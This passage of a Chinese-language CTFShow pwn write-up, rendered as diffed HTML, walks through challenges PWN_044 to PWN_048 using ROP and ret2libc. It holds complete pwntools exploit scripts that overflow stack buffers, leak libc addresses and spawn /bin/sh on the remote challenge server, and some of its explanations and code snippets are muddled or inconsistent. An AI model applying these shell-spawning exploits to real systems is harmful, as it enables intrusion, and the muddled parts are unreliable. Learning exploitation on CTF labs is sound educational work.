+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里有个疑问点就是为什么要用buf2内存变量呢？我直接调用system函数后再注入/bin/sh不就好了吗？这显然不行，因为此时的/bin/sh是一个普通的字符串，并没有分配地址，可执行程序的PIE和ASLR保护机制会让布局发生随机化改变，你给的字符串没地址，而system函数需要接受地址才能执行，而非直接注入无地址的纯字符串，buf2是bss字段的全局变量，地址固定，能给/bin/sh一个固定地址，让system精准找到它并执行。</p>
+<h3 id="pwn_044">PWN_044
+</h3><p>题目：64位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法。 <a class="link" href="PWN_044" >PWN_044</a></p>
+<p>IDA分析：</p>
+<p><img src="/p/ctfshow-pwn-writeup/136.png"
+	width="855"
+	height="194"
+	srcset="/p/ctfshow-pwn-writeup/136_hu_ad575c4dd168699f.png 480w, /p/ctfshow-pwn-writeup/136_hu_f6ed3a0acf42320a.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="440"
+		data-flex-basis="1057px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/137.png"
+	width="671"
+	height="175"
+	srcset="/p/ctfshow-pwn-writeup/137_hu_deb54602fe7918b8.png 480w, /p/ctfshow-pwn-writeup/137_hu_19200459f04ccefb.png 1024w"
+	loading="lazy"
+	
+		alt="gets函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="383"
+		data-flex-basis="920px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/138.png"
+	width="869"
+	height="140"
+	srcset="/p/ctfshow-pwn-writeup/138_hu_176d74d6a11854a.png 480w, /p/ctfshow-pwn-writeup/138_hu_3cd2788b29cb94c5.png 1024w"
+	loading="lazy"
+	
+		alt="bss字段上的buf2变量"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="620"
+		data-flex-basis="1489px"
+	
+></p>
+<p>和上一题区别是参数传递，64位的前6参数是靠寄存器rdi传递的。查询<code>pop rdi；ret</code>汇编命令的地址：</p>
+<p><img src="/p/ctfshow-pwn-writeup/139.png"
+	width="1478"
+	height="361"
+	srcset="/p/ctfshow-pwn-writeup/139_hu_1875753dd456a7b6.png 480w, /p/ctfshow-pwn-writeup/139_hu_56ce53ca262cfd73.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="409"
+		data-flex-basis="982px"
+	
+></p>
+<p>pop rdi ; ret：0x4007f3</p>
+<p>ret：0x4004fe</p>
+<p>那exp大致不变，主要是payload吧：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以发现这是错误的，进入不了交互，错就错在ret，这里不需要进行手动调栈堆平衡：</p>
+<blockquote>
+<p><code>gets</code> 执行完后的总偏移是 44 字节（36+8）。</p>
+<p>后续执行 <code>pop_rdi</code>（8 字节）+ <code>buf2</code> 地址（8 字节）后，总偏移变为 44+8+8=60 字节。</p>
+<p>60 字节 ÷ 16 字节 = 3 余 12？不对 —— 此时调用 <code>system</code> 前，<code>rsp</code> 指向 <code>system</code> 函数的地址，而 <code>60 + 8</code>（<code>system</code> 地址本身）= 68 字节，68 ÷ 16 = 4 余 4？这显然不对。</p>
+<p><strong>正确理解</strong>：不用纠结静态数字，而是要看到 <code>gets</code> 的执行引入了一次 “额外的栈弹出”（8 字节），恰好抵消了部分偏移的 “非对齐量”，使得最终调用 <code>system</code> 时，<code>rsp</code> 刚好落在 16 字节对齐的地址上 —— 这是<em>动态执行</em>中栈自然调整的结果，而非静态计算的总和。</p></blockquote>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p>在 64 位 PWN 题中，“动态对齐” 是否需要加 <code>ret</code>，核心看 <strong>“中间是否有函数执行并自动调整栈指针”</strong>。</p></blockquote></blockquote>
+<p>正确的exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28244</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gets</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4007f3</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;buf2&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_045">PWN_045
+</h3><p>题目：32位 无 system 无 &ldquo;/bin/sh&rdquo;。 <a class="link" href="PWN_045" >PWN_045</a></p>
+<p>checksec一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/142.png"
+	width="910"
+	height="200"
+	srcset="/p/ctfshow-pwn-writeup/142_hu_82abb708cf1a0811.png 480w, /p/ctfshow-pwn-writeup/142_hu_f4f82383442791c4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="455"
+		data-flex-basis="1092px"
+	
+></p>
+<p>32位关闭栈保护关闭PIE。</p>
+<p>IDA分析main：</p>
+<p><img src="/p/ctfshow-pwn-writeup/140.png"
+	width="711"
+	height="240"
+	srcset="/p/ctfshow-pwn-writeup/140_hu_175a81e93975ecf3.png 480w, /p/ctfshow-pwn-writeup/140_hu_cd9361b7005e1aae.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="296"
+		data-flex-basis="711px"
+	
+></p>
+<p>跟进ctfshow函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/141.png"
+	width="608"
+	height="195"
+	srcset="/p/ctfshow-pwn-writeup/141_hu_c9fb5296e0aa6dc5.png 480w, /p/ctfshow-pwn-writeup/141_hu_f7ef6bad6f31ddd8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="748px"
+	
+></p>
+<p>还是明显的溢出漏洞了，只是其中的偏移变了，大差不差，现在我们关心的是如何去找到我们所需要的东西呢？现在既没有system，也没有“/bin/sh”</p>
+<p>思路：地址随机化+NX保护禁用ret2shellcode，那就是暗示我用ret2libc咯，用LibcSearcher获取当前libc版本，利用write泄露出write本身函数地址，再获取程序中因开启NX保护时地址随机化的write虚拟地址，两个地址相减得到地址偏移量，接着就能反推出system、/bin/sh的真实地址了。在此之前要记得先填充好变量的缓冲区。</p>
+<p>上半部分exp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28307</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;O.o?&#39;</span><span class="p">)</span>  <span class="c1">#等程序发送这字符串蔡发送第一份payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这时候已经把write函数地址泄露出来了，不过看到这里比较懵逼哈，payload为什么要上传这么多，直接调用write函数不行了吗？还要got、plt啥的（堆plt、got不熟悉的可以看回<a class="link" href="https://expl0rer.top/p/pwn-1/#plt%e4%b8%8egot"  target="_blank" rel="noopener"
+    >PWN-1中plt和got表的讲解</a>）。让我给你细分一下：先调用write_plt，这指write函数的执行入口，告诉write我要使用你了，调用write后，会从栈上读取这个地址作为下一条指令的位置。这里指定 main 函数，是为了让程序在泄露地址后回到主函数，继续接收我们的第二次payload（用于后续调用 system 获取 shell），避免程序直接退出。第一次payload是获得write地址，第二次payload是执行system函数。</p>
+<p>接着到p32(1) + p32(write_got) + p32(4)：write 函数的三个参数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/143.png"
+	width="670"
+	height="135"
+	srcset="/p/ctfshow-pwn-writeup/143_hu_f3c975e2df9b88f1.png 480w, /p/ctfshow-pwn-writeup/143_hu_c713cca5ee6c652a.png 1024w"
+	loading="lazy"
+	
+		alt="write函数原型"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="496"
+		data-flex-basis="1191px"
+	
+></p>
+<p>32 位程序中参数通过栈从右往左传递，因此栈上顺序为：<code>fd</code> → <code>buf</code> → <code>n</code>，也就是 <code>write(1, write_got, 4)</code></p>
+<p>来下半部分exp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span> <span class="c1">#用LibcSearcher查询write对应的libc当前版本</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>write = u32(io.recvuntil(&rsquo;\xf7&rsquo;)[-4:])这一段比较长，做过之前题目对此有点印象，不应该是write = u32(io.recv(4))？</p>
+<p>核心原因是<strong>程序输出中存在干扰信息，导致无法直接读取到纯净的 4 字节地址</strong>，你执行一下程序就知道了，会有“O.o?”冒出来，这是干扰。</p>
+<p><code>io.recv(4)</code> 是有局限性的，<code>io.recv(4)</code> 的作用是<strong>从程序输出中读取固定的 4 字节数据</strong>，但它有一个严格前提：<strong>程序必须只输出我们需要的 4 字节地址，没有任何多余内容</strong>（如提示文本、换行符、其他数据等）。此时recv直接读取4个字节，那就会读到O.o?的字节导致错误。</p>
+<p><strong><code>recvuntil('\xf7')[-4:]</code></strong>：适用于程序输出存在干扰信息，且地址以 <code>\xf7</code> 开头（32 位 libc 典型特征）的场景，通过特征定位 + 截取来提取正确地址。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">8</span><span class="p">:])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_046待定">PWN_046（待定）
+</h3><p>题目：64位 无 system 无 &ldquo;/bin/sh&rdquo;。 <a class="link" href="PWN_046" >PWN_046</a></p>
+<p>IDA64分析：</p>
+<p><img src="/p/ctfshow-pwn-writeup/144.png"
+	width="836"
+	height="195"
+	srcset="/p/ctfshow-pwn-writeup/144_hu_cf5ef8ac764a5ada.png 480w, /p/ctfshow-pwn-writeup/144_hu_c486a541b03ac4d3.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="428"
+		data-flex-basis="1028px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/145.png"
+	width="838"
+	height="145"
+	srcset="/p/ctfshow-pwn-writeup/145_hu_745994514c60a089.png 480w, /p/ctfshow-pwn-writeup/145_hu_de6931636b3f1092.png 1024w"
+	loading="lazy"
+	
+		alt="跟进ctfshow函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="577"
+		data-flex-basis="1387px"
+	
+></p>
+<p>和上题思路差不多，改下参数就好，还有这个O.o?干扰你&hellip;&hellip;</p>
+<p>题目有点怪我先跳一跳，</p>
+<p>待定</p>
+<h3 id="pwn_047">PWN_047
+</h3><p>题目：ez ret2libc     <a class="link" href="PWN_047" >PWN_047</a></p>
+<p>就提示用ret2libc</p>
+<p>checksec一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/146.png"
+	width="770"
+	height="234"
+	srcset="/p/ctfshow-pwn-writeup/146_hu_fc06a635d328f011.png 480w, /p/ctfshow-pwn-writeup/146_hu_919669922d8ebe2f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="329"
+		data-flex-basis="789px"
+	
+></p>
+<p>IDA32位分析：</p>
+<p><img src="/p/ctfshow-pwn-writeup/147.png"
+	width="864"
+	height="290"
+	srcset="/p/ctfshow-pwn-writeup/147_hu_ecb2389afc78956f.png 480w, /p/ctfshow-pwn-writeup/147_hu_c87d29f473550c93.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="715px"
+	
+></p>
+<p>运行程序：</p>
+<p><img src="/p/ctfshow-pwn-writeup/148.png"
+	width="1075"
+	height="585"
+	srcset="/p/ctfshow-pwn-writeup/148_hu_68a9c42744f4d3b5.png 480w, /p/ctfshow-pwn-writeup/148_hu_2f76dbfda3e7bb57.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="441px"
+	
+></p>
+<p>一上来就给了几个函数的地址，目前来看还没给出system的地址。</p>
+<p>跟进ctfshow函数还发现了<code>gets</code>函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/149.png"
+	width="720"
+	height="200"
+	srcset="/p/ctfshow-pwn-writeup/149_hu_f03cd6d93e5d9470.png 480w, /p/ctfshow-pwn-writeup/149_hu_dce5425d9dfb9004.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="360"
+		data-flex-basis="864px"
+	
+></p>
+<p>那就是通过栈溢出ret2libc来搞flag咯。</p>
+<p>在data字段还找到了/bin/sh：</p>
+<p><img src="/p/ctfshow-pwn-writeup/150.png"
+	width="870"
+	height="288"
+	srcset="/p/ctfshow-pwn-writeup/150_hu_80b41588e2888370.png 480w, /p/ctfshow-pwn-writeup/150_hu_14f781a1e68c7689.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p>你有无发现：这个/bin/sh的地址就是gift</p>
+<p><img src="/p/ctfshow-pwn-writeup/151.png"
+	width="1204"
+	height="570"
+	srcset="/p/ctfshow-pwn-writeup/151_hu_fc6f5087e790c1de.png 480w, /p/ctfshow-pwn-writeup/151_hu_f0d75ad6073237cd.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
+></p>
+<p>那思路就是用puts进行泄露地址，得出偏移量再反推出system函数的真实地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28146</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;puts:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;gift:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">))</span>  <span class="c1">#只读取地址，丢弃换行\n的16进制字符串</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x9c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_048">PWN_048
+</h3><p>题目：没有write了，试试用puts吧，更简单了呢。 <a class="link" href="PWN_048" >PWN_048</a></p>
+<p><img src="/p/ctfshow-pwn-writeup/152.png"
+	width="795"
+	height="234"
+	srcset="/p/ctfshow-pwn-writeup/152_hu_82ddc294ee9dbdfb.png 480w, /p/ctfshow-pwn-writeup/152_hu_da96e2278b37543.png 1024w"
+	loading="lazy"
+	
+		alt="checksec"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="339"
+		data-flex-basis="815px"
+	
+></p>
+<p>IDA32分析：</p>
